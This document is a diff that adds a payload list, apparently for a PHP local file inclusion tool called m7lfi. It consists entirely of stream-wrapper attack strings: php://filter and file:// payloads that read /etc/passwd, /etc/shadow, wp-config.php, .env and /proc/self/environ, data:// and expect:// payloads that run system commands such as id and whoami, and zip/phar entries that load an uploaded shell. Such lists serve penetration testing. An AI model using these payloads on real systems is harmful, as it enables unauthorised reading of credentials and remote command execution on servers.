@@ -1,0 +1,65 @@
+# m7lfi - PHP Stream Wrapper Payloads
+# Milkyway Intelligence | Sharlix
+
+# php://filter – base64 encode (bypasses content filters)
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/shadow
+php://filter/convert.base64-encode/resource=/etc/hosts
+php://filter/convert.base64-encode/resource=/etc/hostname
+php://filter/convert.base64-encode/resource=/var/www/html/index.php
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../config.php
+php://filter/convert.base64-encode/resource=wp-config.php
+php://filter/convert.base64-encode/resource=../wp-config.php
+php://filter/convert.base64-encode/resource=../../wp-config.php
+php://filter/convert.base64-encode/resource=.env
+php://filter/convert.base64-encode/resource=../.env
+php://filter/convert.base64-encode/resource=../../.env
+php://filter/convert.base64-encode/resource=database.php
+php://filter/convert.base64-encode/resource=db.php
+php://filter/convert.base64-encode/resource=connect.php
+php://filter/convert.base64-encode/resource=settings.php
+php://filter/convert.base64-encode/resource=configuration.php
+
+# php://filter – rot13 (another obfuscation layer)
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=string.rot13/resource=config.php
+
+# php://filter – zlib deflate
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+
+# php://filter chained
+php://filter/read=convert.base64-encode|convert.base64-encode/resource=/etc/passwd
+
+# expect:// (requires expect extension)
+expect://id
+expect://whoami
+expect://cat /etc/passwd
+
+# data:// (requires allow_url_include)
+data://text/plain,<?php echo system('id'); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+data:text/plain,<?php phpinfo(); ?>
+
+# file:// 
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///var/www/html/index.php
+file:///proc/self/environ
+
+# zip:// (if upload allowed)
+zip://uploads/file.zip%23shell.php
+
+# phar://
+phar://uploads/file.phar/shell.php
+
+# glob://
+glob:///etc/p*
+
+# php://input (requires POST)
+php://input
